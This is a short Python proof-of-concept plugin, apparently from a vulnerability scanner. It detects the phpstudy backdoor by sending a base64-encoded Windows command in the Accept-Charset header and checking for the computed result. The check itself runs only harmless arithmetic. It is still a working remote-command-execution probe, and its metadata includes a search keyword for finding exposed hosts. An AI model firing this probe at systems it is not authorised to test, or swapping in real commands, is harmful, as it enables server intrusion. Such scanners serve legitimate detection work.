#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import base64
import random
import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "phpstudy 后门",
        "desc": "攻击者通过此漏洞可远程命令执行，进而入侵控制服务器。",
        "grade": "高",
        "type": "web",
        "keyword": "tag:phpstudy language:php",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    rand_a = random.randint(200000000, 210000000)
    rand_b = random.randint(200000000, 210000000)
    payload = f'set /a {rand_a} + {rand_b}'
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg,
        'Accept-Charset': base64.b64encode(payload.encode("utf8")).decode("utf8")
        }
    rand_str = str(random.randint(200000000, 210000000))
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and str(rand_a + rand_b) in r.text:
            return True
        else:
            return False
    except Exception:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

